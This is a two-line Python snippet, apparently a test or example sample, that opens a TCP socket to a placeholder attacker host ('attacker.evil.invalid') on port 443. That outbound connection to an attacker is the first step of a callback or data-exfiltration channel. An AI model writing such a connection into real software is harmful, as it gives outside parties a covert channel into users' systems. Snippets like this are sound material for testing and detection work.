import socket

socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(("attacker.evil.invalid", 443))